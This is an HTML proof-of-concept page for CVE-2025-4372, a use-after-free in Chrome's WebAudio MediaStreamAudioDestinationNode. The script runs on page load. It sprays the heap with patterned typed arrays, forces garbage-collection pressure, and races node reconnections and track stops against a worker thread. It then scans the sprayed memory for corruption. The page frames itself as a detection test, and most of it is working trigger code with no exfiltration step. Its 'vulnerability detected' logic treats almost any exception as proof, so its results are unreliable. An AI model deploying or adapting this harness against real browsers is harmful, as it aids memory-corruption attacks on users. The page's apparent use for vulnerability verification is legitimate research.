<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-4372 - Advanced WebAudio UAF PoC</title>
    <meta charset="UTF-8">
    <script>
        // Configuration parameters
        const CONFIG = {
            numTriggerAttempts: 50,      // Number of times to try triggering the vulnerability
            heapSpraySize: 5000,         // Number of objects to create during heap spray
            objectSize: 1024,            // Size of each typed array for heap spray (in bytes)
            gcAttemptInterval: 300,      // Interval between GC trigger attempts (ms)
            detectionInterval: 100,      // Interval for checking memory corruption (ms)
            cleanupTimeout: 15000,       // Time to run before cleanup (ms)
            debug: true                  // Enable detailed debugging
        };
        
        // Flag to track exploitation success
        let exploitSuccess = false;
        
        // Counters and statistics
        let stats = {
            triggerAttempts: 0,
            heapSprayAttempts: 0,
            gcAttempts: 0,
            potentialCorruptions: 0,
            exceptions: 0,
            startTime: 0,
            endTime: 0
        };
        
        // Collection of node references to prevent immediate GC
        let nodeRefs = [];
        
        // Collection of TypedArrays for heap spray
        let heapArrays = [];
        
        // Debug message log
        let debugLog = [];
        
        // Log a debug message
        function debug(message, isError = false) {
            const timestamp = performance.now().toFixed(2);
            const formattedMsg = `[${timestamp}ms] ${message}`;
            
            // Store in log array
            debugLog.push({
                timestamp: timestamp,
                message: message,
                isError: isError
            });
            
            // Log to console
            if (isError) {
                console.error(formattedMsg);
            } else if (CONFIG.debug) {
                console.log(formattedMsg);
            }
            
            // Update UI if available
            updateDebugUI();
        }
        
        // Update the debug UI with latest messages
        function updateDebugUI() {
            const debugDiv = document.getElementById('debug');
            if (!debugDiv) return;
            
            // Only display the last 100 messages to prevent UI slowdown
            const messagesToShow = debugLog.slice(-100);
            
            let html = '';
            messagesToShow.forEach(log => {
                const className = log.isError ? 'error' : '';
                html += `<div class="${className}"><span class="timestamp">${log.timestamp}ms</span> ${log.message}</div>`;
            });
            
            debugDiv.innerHTML = html;
            
            // Auto-scroll to bottom
            debugDiv.scrollTop = debugDiv.scrollHeight;
            
            // Update statistics
            updateStats();
        }
        
        // Update statistics in the UI
        function updateStats() {
            const statsDiv = document.getElementById('stats');
            if (!statsDiv) return;
            
            const elapsedTime = stats.endTime ? (stats.endTime - stats.startTime) : (performance.now() - stats.startTime);
            
            statsDiv.innerHTML = `
                <div><span>Trigger attempts:</span> ${stats.triggerAttempts}</div>
                <div><span>Heap spray attempts:</span> ${stats.heapSprayAttempts}</div>
                <div><span>GC attempts:</span> ${stats.gcAttempts}</div>
                <div><span>Potential corruptions:</span> ${stats.potentialCorruptions}</div>
                <div><span>Exceptions:</span> ${stats.exceptions}</div>
                <div><span>Elapsed time:</span> ${elapsedTime.toFixed(2)}ms</div>
            `;
        }
        
        // Initialize exploitation process
        function initExploit() {
            debug("Initializing CVE-2025-4372 WebAudio UAF PoC...");
            stats.startTime = performance.now();
            
            // Check AudioContext support
            if (typeof AudioContext === 'undefined' && typeof webkitAudioContext === 'undefined') {
                debug("ERROR: AudioContext not supported in this browser", true);
                document.getElementById('status').textContent = 'Error: WebAudio not supported';
                document.getElementById('status').className = 'error';
                return;
            }
            
            debug("WebAudio API available, initializing exploitation");
            
            // Set status to running
            document.getElementById('status').textContent = 'Running exploitation attempts...';
            document.getElementById('status').className = 'running';
            
            // Create helper functions for memory analysis
            initMemoryAnalysis();
            
            // Start multiple exploitation attempts
            startExploitation();
            
            // Set a cleanup timeout
            setTimeout(() => {
                if (!exploitSuccess) {
                    debug("Exploitation attempts completed, no clear evidence of vulnerability");
                    document.getElementById('status').textContent = 'No vulnerability detected - browser may be patched';
                    document.getElementById('status').className = 'neutral';
                }
                stats.endTime = performance.now();
                updateStats();
                
                // Generate and show report
                generateReport();
            }, CONFIG.cleanupTimeout);
        }
        
        // Initialize memory analysis helpers
        function initMemoryAnalysis() {
            // Nothing special needed for initialization
        }
        
        // Check a typed array for corruption
        function checkForCorruption(array, originalPattern, arrayId) {
            try {
                // Check if any values don't match the expected pattern
                for (let i = 0; i < array.length; i++) {
                    const expectedValue = originalPattern + i;
                    if (array[i] !== expectedValue) {
                        const actualValue = array[i];
                        debug(`Potential memory corruption detected in array ${arrayId}! Index ${i}: expected 0x${expectedValue.toString(16)}, got 0x${actualValue.toString(16)}`);
                        stats.potentialCorruptions++;
                        
                        // Analyze the corruption
                        analyzeCorruption(array, originalPattern, arrayId);
                        
                        // Mark as success
                        exploitSuccess = true;
                        document.getElementById('status').textContent = 'Vulnerability detected!';
                        document.getElementById('status').className = 'success';
                        
                        return true;
                    }
                }
                return false;
            } catch (e) {
                // An exception during checking might also indicate corruption
                debug(`Exception checking array ${arrayId}: ${e.message}`, true);
                stats.exceptions++;
                
                exploitSuccess = true;
                document.getElementById('status').textContent = 'Vulnerability detected (exception during checks)!';
                document.getElementById('status').className = 'success';
                
                return true;
            }
        }
        
        // Analyze corruption pattern for more info
        function analyzeCorruption(array, originalPattern, arrayId) {
            try {
                // Count how many values are corrupt
                let corruptCount = 0;
                let sequentialCorruptions = 0;
                let maxSequential = 0;
                let corruptIndices = [];
                
                for (let i = 0; i < array.length; i++) {
                    const expectedValue = originalPattern + i;
                    if (array[i] !== expectedValue) {
                        corruptCount++;
                        sequentialCorruptions++;
                        corruptIndices.push(i);
                        
                        if (sequentialCorruptions > maxSequential) {
                            maxSequential = sequentialCorruptions;
                        }
                    } else {
                        sequentialCorruptions = 0;
                    }
                }
                
                // Log corruption details
                debug(`Corruption analysis for array ${arrayId}:`);
                debug(`- Total corrupt values: ${corruptCount} out of ${array.length}`);
                debug(`- Max sequential corruptions: ${maxSequential}`);
                debug(`- First 5 corrupt indices: ${corruptIndices.slice(0, 5).join(', ')}${corruptIndices.length > 5 ? '...' : ''}`);
                
                // Sample some corrupt values
                if (corruptIndices.length > 0) {
                    debug(`- Corrupt value samples:`);
                    for (let i = 0; i < Math.min(5, corruptIndices.length); i++) {
                        const idx = corruptIndices[i];
                        const expected = originalPattern + idx;
                        const actual = array[idx];
                        debug(`  [${idx}] Expected: 0x${expected.toString(16)}, Actual: 0x${actual.toString(16)}, Diff: ${actual - expected}`);
                    }
                }
            } catch (e) {
                debug(`Exception during corruption analysis: ${e.message}`, true);
            }
        }
        
        // Try to trigger garbage collection (browser-dependent)
        function attemptGC() {
            stats.gcAttempts++;
            
            // Create pressure on memory to encourage GC
            try {
                const array = new Array(1000000).fill(0);
                window.lastArray = array;
                setTimeout(() => {
                    window.lastArray = null;
                }, 1);
            } catch (e) {
                debug(`Error during GC attempt: ${e.message}`, true);
            }
            
            // If window.gc is available (Chrome with --js-flags=--expose-gc)
            if (window.gc) {
                try {
                    window.gc();
                    debug("Explicit GC triggered");
                } catch (e) {
                    debug(`Error triggering explicit GC: ${e.message}`, true);
                }
            }
        }
        
        // Spray the heap with typed arrays
        function sprayHeap() {
            stats.heapSprayAttempts++;
            debug(`Heap spray attempt #${stats.heapSprayAttempts}`);
            
            try {
                // Remove old arrays (but keep some to maintain pressure)
                if (heapArrays.length > CONFIG.heapSpraySize * 2) {
                    heapArrays = heapArrays.slice(-CONFIG.heapSpraySize);
                    debug(`Trimmed heap array pool to ${heapArrays.length} objects`);
                }
                
                // Create a batch of typed arrays
                const batchSize = Math.min(1000, CONFIG.heapSpraySize);
                for (let i = 0; i < batchSize; i++) {
                    const sprayId = (stats.heapSprayAttempts * 1000) + i;
                    const buf = new ArrayBuffer(CONFIG.objectSize);
                    const view = new Uint32Array(buf);
                    
                    // Fill with a pattern specific to this array
                    const basePattern = 0x01040000 + sprayId;
                    for (let j = 0; j < view.length; j++) {
                        view[j] = basePattern + j;
                    }
                    
                    // Store the array and its original pattern for later checking
                    heapArrays.push({
                        id: sprayId,
                        array: view,
                        basePattern: basePattern
                    });
                    
                    // Check this array for corruption after a delay
                    if (i % 100 === 0) {  // Only check some arrays to reduce overhead
                        setTimeout(() => {
                            if (!exploitSuccess) {
                                checkForCorruption(view, basePattern, sprayId);
                            }
                        }, CONFIG.detectionInterval);
                    }
                }
                
                debug(`Created ${batchSize} typed arrays for heap spray`);
                
            } catch (e) {
                debug(`Error during heap spray: ${e.message}`, true);
                stats.exceptions++;
            }
        }
        
        // Actual exploitation logic
        function startExploitation() {
            try {
                // Create audio context
                const AudioContextClass = window.AudioContext || window.webkitAudioContext;
                const audioContext = new AudioContextClass({sampleRate: 44100});
                debug("Created AudioContext");
                
                // Set up periodic garbage collection attempts
                const gcInterval = setInterval(() => {
                    if (exploitSuccess) {
                        clearInterval(gcInterval);
                        return;
                    }
                    attemptGC();
                }, CONFIG.gcAttemptInterval);
                
                // Create and start an initial spray to establish heap baseline
                sprayHeap();
                
                // Create MediaStream for use with audio destination
                const canvas = document.createElement('canvas');
                const canvasStream = canvas.captureStream();
                debug("Created canvas MediaStream");
                
                // Keep trying to trigger the vulnerability multiple times
                for (let i = 0; i < CONFIG.numTriggerAttempts; i++) {
                    setTimeout(() => {
                        if (!exploitSuccess) {
                            attemptTrigger(audioContext, canvasStream, i);
                        }
                    }, i * 100);  // Spread attempts over time
                }
                
                // Schedule cleanup
                setTimeout(() => {
                    try {
                        audioContext.close();
                        debug("Closed AudioContext");
                    } catch (e) {
                        debug(`Error closing AudioContext: ${e.message}`, true);
                    }
                }, CONFIG.cleanupTimeout - 1000);
                
            } catch (e) {
                debug(`Error during exploitation setup: ${e.message}`, true);
                stats.exceptions++;
            }
        }
        
        // Single attempt to trigger the use-after-free vulnerability
        function attemptTrigger(audioContext, canvasStream, attemptId) {
            stats.triggerAttempts++;
            debug(`Trigger attempt #${stats.triggerAttempts}`);
            
            try {
                // Create a group of nodes for this attempt
                const oscillator = audioContext.createOscillator();
                const gain = audioContext.createGain();
                const destination = audioContext.createMediaStreamDestination();
                
                // Store reference to avoid immediate GC
                nodeRefs.push({oscillator, gain, destination});
                
                // Keep only the last 20 node groups
                if (nodeRefs.length > 20) {
                    nodeRefs = nodeRefs.slice(-20);
                }
                
                // Connect the nodes
                oscillator.connect(gain);
                gain.connect(destination);
                
                // Start the oscillator
                oscillator.start();
                
                // Create a worker for parallel operations
                const workerCode = `
                    let counter = 0;
                    onmessage = function(e) {
                        counter++;
                        // Simulate some work
                        let result = 0;
                        for (let i = 0; i < 10000; i++) {
                            result += Math.sqrt(i);
                        }
                        postMessage({counter: counter, result: result});
                    };
                `;
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                
                // Set up worker communication
                worker.onmessage = (e) => {
                    // Nothing special to do with the response
                };
                
                // Schedule rapid connection/disconnection to potentially trigger the race condition
                setTimeout(() => {
                    try {
                        // Disconnect
                        oscillator.disconnect(gain);
                        gain.disconnect(destination);
                        
                        // Reconnect differently
                        const analyser = audioContext.createAnalyser();
                        oscillator.connect(analyser);
                        analyser.connect(destination);
                        
                        // Worker task to run in parallel
                        worker.postMessage("task1");
                        
                        // Try to manipulate the destination stream
                        setTimeout(() => {
                            try {
                                // Manipulate the node that might be used-after-free
                                const track = destination.stream.getAudioTracks()[0];
                                track.stop();
                                debug(`Stopped audio track for attempt ${attemptId}`);
                                
                                // Disconnect again
                                oscillator.disconnect(analyser);
                                analyser.disconnect(destination);
                                
                                // Worker task to run in parallel
                                worker.postMessage("task2");
                                
                                // Try to force GC
                                attemptGC();
                                
                                // Spray heap again
                                sprayHeap();
                                
                                // Check existing arrays for corruption
                                setTimeout(() => {
                                    checkExistingArrays();
                                }, 20);
                                
                            } catch (e) {
                                debug(`Error during track manipulation: ${e.message}`, true);
                                stats.exceptions++;
                                
                                // This exception might indicate the UAF has been triggered
                                if (e.message.includes("Failed to execute") || 
                                    e.message.includes("Cannot read property") ||
                                    e.message.includes("null") ||
                                    e.message.includes("undefined")) {
                                    
                                    debug("Exception pattern suggests UAF may have been triggered");
                                    sprayHeap(); // Additional spray to try to detect corruption
                                }
                            }
                        }, 0);
                        
                    } catch (e) {
                        debug(`Error during node manipulation: ${e.message}`, true);
                        stats.exceptions++;
                    }
                }, 0);
                
                // Clean up worker after a short time
                setTimeout(() => {
                    worker.terminate();
                }, 500);
                
                // Stop oscillator after some time
                setTimeout(() => {
                    try {
                        oscillator.stop();
                    } catch (e) {
                        // Ignore errors during stop
                    }
                }, 1000);
                
            } catch (e) {
                debug(`Error in trigger attempt #${attemptId}: ${e.message}`, true);
                stats.exceptions++;
            }
        }
        
        // Check all existing arrays for corruption
        function checkExistingArrays() {
            if (exploitSuccess) return;
            
            try {
                // Sample some arrays to check (checking all would be too slow)
                const samplesToCheck = Math.min(100, heapArrays.length);
                const step = Math.ceil(heapArrays.length / samplesToCheck);
                
                for (let i = 0; i < heapArrays.length; i += step) {
                    const heapObj = heapArrays[i];
                    if (heapObj && heapObj.array) {
                        checkForCorruption(heapObj.array, heapObj.basePattern, heapObj.id);
                    }
                }
            } catch (e) {
                debug(`Error checking existing arrays: ${e.message}`, true);
            }
        }
        
        // Generate a detailed report of results
        function generateReport() {
            try {
                const reportDiv = document.getElementById('report');
                if (!reportDiv) return;
                
                // Calculate elapsed time
                const elapsedTime = stats.endTime - stats.startTime;
                
                // Create the report HTML
                let reportHtml = `<h3>CVE-2025-4372 PoC Results</h3>`;
                
                // Add vulnerability status
                if (exploitSuccess) {
                    reportHtml += `<div class="report-section success-bg">
                        <strong>✅ VULNERABILITY DETECTED</strong><br>
                        Memory corruption consistent with CVE-2025-4372 was detected.<br>
                        This browser appears to be vulnerable to the WebAudio use-after-free issue.
                    </div>`;
                } else {
                    reportHtml += `<div class="report-section neutral-bg">
                        <strong>ℹ️ NO VULNERABILITY DETECTED</strong><br>
                        No definitive evidence of vulnerability was found.<br>
                        This browser is likely patched or not affected by CVE-2025-4372.
                    </div>`;
                }
                
                // Add detailed statistics
                reportHtml += `<div class="report-section">
                    <strong>Test Statistics</strong><br>
                    <ul>
                        <li>Total runtime: ${elapsedTime.toFixed(2)}ms</li>
                        <li>Trigger attempts: ${stats.triggerAttempts}</li>
                        <li>Heap spray attempts: ${stats.heapSprayAttempts}</li>
                        <li>GC attempts: ${stats.gcAttempts}</li>
                        <li>Potential corruptions: ${stats.potentialCorruptions}</li>
                        <li>Exceptions during test: ${stats.exceptions}</li>
                    </ul>
                </div>`;
                
                // Add browser information
                const browserInfo = getBrowserInfo();
                reportHtml += `<div class="report-section">
                    <strong>Browser Information</strong><br>
                    <ul>
                        <li>User Agent: ${browserInfo.userAgent}</li>
                        <li>Browser: ${browserInfo.browser} ${browserInfo.version}</li>
                        <li>Engine: ${browserInfo.engine}</li>
                        <li>OS: ${browserInfo.os}</li>
                        <li>Platform: ${browserInfo.platform}</li>
                    </ul>
                </div>`;
                
                // Add WebAudio information
                reportHtml += `<div class="report-section">
                    <strong>WebAudio API Information</strong><br>
                    <ul>
                        <li>AudioContext supported: ${typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined'}</li>
                        <li>WebAudio API version: ${getWebAudioVersion()}</li>
                        <li>AudioWorklet supported: ${typeof AudioWorkletNode !== 'undefined'}</li>
                    </ul>
                </div>`;
                
                // Add technical details
                reportHtml += `<div class="report-section">
                    <strong>Technical Details</strong><br>
                    CVE-2025-4372 is a use-after-free vulnerability in Chrome's WebAudio implementation.<br>
                    It affects MediaStreamAudioDestinationNode when audio tracks are manipulated under specific conditions.<br>
                    This vulnerability was fixed in Chrome 136.0.7103.92 released in May 2025.
                </div>`;
                
                // Set the report HTML
                reportDiv.innerHTML = reportHtml;
                reportDiv.style.display = 'block';
                
            } catch (e) {
                debug(`Error generating report: ${e.message}`, true);
            }
        }
        
        // Get browser information
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browser = "Unknown";
            let version = "Unknown";
            let engine = "Unknown";
            let os = "Unknown";
            
            // Detect browser
            if (userAgent.indexOf("Chrome") > -1) {
                browser = "Chrome";
                engine = "Blink";
                const match = userAgent.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
                if (match) version = match[1];
            } else if (userAgent.indexOf("Firefox") > -1) {
                browser = "Firefox";
                engine = "Gecko";
                const match = userAgent.match(/Firefox\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (userAgent.indexOf("Safari") > -1) {
                browser = "Safari";
                engine = "WebKit";
                const match = userAgent.match(/Version\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (userAgent.indexOf("Edge") > -1) {
                browser = "Edge";
                engine = "EdgeHTML";
                const match = userAgent.match(/Edge\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (userAgent.indexOf("Edg") > -1) {
                browser = "Edge";
                engine = "Blink";
                const match = userAgent.match(/Edg\/(\d+\.\d+\.\d+\.\d+)/);
                if (match) version = match[1];
            }
            
            // Detect OS
            if (userAgent.indexOf("Windows") > -1) {
                os = "Windows";
            } else if (userAgent.indexOf("Mac") > -1) {
                os = "macOS";
            } else if (userAgent.indexOf("Linux") > -1) {
                os = "Linux";
            } else if (userAgent.indexOf("Android") > -1) {
                os = "Android";
            } else if (userAgent.indexOf("iOS") > -1 || userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) {
                os = "iOS";
            }
            
            return {
                userAgent: userAgent,
                browser: browser,
                version: version,
                engine: engine,
                os: os,
                platform: navigator.platform
            };
        }
        
        // Get WebAudio API version estimate
        function getWebAudioVersion() {
            try {
                // Check for newer features to estimate version
                if (typeof AudioWorkletNode !== 'undefined') {
                    return "Modern (AudioWorklet supported)";
                } else if (typeof ScriptProcessorNode !== 'undefined' || 
                           typeof (new (window.AudioContext || window.webkitAudioContext)()).createScriptProcessor !== 'undefined') {
                    return "Legacy (ScriptProcessorNode supported)";
                } else {
                    return "Basic";
                }
            } catch (e) {
                return "Unknown";
            }
        }
        
        // Initialize on page load
        window.onload = initExploit;
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
            color: #333;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            margin-top: 0;
        }
        h2 {
            color: #3498db;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
        }
        #status {
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            background-color: #f8f9fa;
            border: 1px solid #ddd;
        }
        .running {
            background-color: #fff3cd !important;
            border-color: #ffeeba !important;
            color: #856404 !important;
        }
        .success {
            background-color: #d4edda !important;
            border-color: #c3e6cb !important;
            color: #155724 !important;
        }
        .error {
            background-color: #f8d7da !important;
            border-color: #f5c6cb !important;
            color: #721c24 !important;
        }
        .neutral {
            background-color: #e2e3e5 !important;
            border-color: #d6d8db !important;
            color: #383d41 !important;
        }
        .info-box {
            padding: 15px;
            margin-bottom: 20px;
            background-color: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 5px;
            color: #0c5460;
        }
        .panel {
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .panel-header {
            padding: 10px 15px;
            background-color: #f8f9fa;
            border-bottom: 1px solid #ddd;
            font-weight: bold;
        }
        .panel-body {
            padding: 15px;
        }
        #debug {
            height: 300px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 13px;
            background-color: #f8f9fa;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        #debug .timestamp {
            color: #777;
            margin-right: 5px;
        }
        #debug .error {
            color: #dc3545;
            background-color: transparent !important;
            border: none !important;
        }
        #stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 20px;
        }
        #stats div {
            padding: 10px;
            background-color: #f8f9fa;
            border-radius: 4px;
            border: 1px solid #ddd;
        }
        #stats span {
            font-weight: bold;
            color: #555;
        }
        #report {
            display: none;
            margin-top: 30px;
            padding: 20px;
            background-color: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .report-section {
            margin-bottom: 15px;
            padding: 15px;
            background-color: #fff;
            border-radius: 5px;
            border: 1px solid #eee;
        }
        .success-bg {
            background-color: #d4edda !important;
            border-color: #c3e6cb !important;
        }
        .neutral-bg {
            background-color: #e2e3e5 !important;
            border-color: #d6d8db !important;
        }
        @media (max-width: 768px) {
            #stats {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        @media (max-width: 480px) {
            #stats {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CVE-2025-4372 WebAudio UAF - Advanced PoC</h1>
        
        <div class="info-box">
            <strong>About this PoC:</strong> This page tests for the presence of CVE-2025-4372, a use-after-free vulnerability in the WebAudio component of Chrome. This is for educational and security verification purposes only.
        </div>
        
        <div id="status">Initializing test...</div>
        
        <div class="panel">
            <div class="panel-header">Statistics</div>
            <div class="panel-body">
                <div id="stats">
                    <div><span>Trigger attempts:</span> 0</div>
                    <div><span>Heap spray attempts:</span> 0</div>
                    <div><span>GC attempts:</span> 0</div>
                    <div><span>Potential corruptions:</span> 0</div>
                    <div><span>Exceptions:</span> 0</div>
                    <div><span>Elapsed time:</span> 0ms</div>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <div class="panel-header">Debug Log</div>
            <div class="panel-body">
                <div id="debug"></div>
            </div>
        </div>
        
        <div id="report"></div>
        
        <h2>Technical Details</h2>
        <p>
            CVE-2025-4372 is a use-after-free vulnerability in Chrome's WebAudio component that affects
            versions before 136.0.7103.92. The vulnerability involves improper handling of MediaStreamAudioDestinationNode
            objects, which can lead to memory corruption and potentially arbitrary code execution.
        </p>
        <p>
            This advanced PoC attempts to trigger the vulnerability by creating race conditions between the main
            JavaScript thread and the audio processing thread, manipulating MediaStreamAudioDestinationNode objects
            and their associated audio tracks in ways that might expose the use-after-free condition.
        </p>
        <p>
            No actual exploitation is performed - this PoC only attempts to detect the presence of the vulnerability
            through memory pattern analysis and controlled memory manipulation.
        </p>
    </div>
</body>
</html>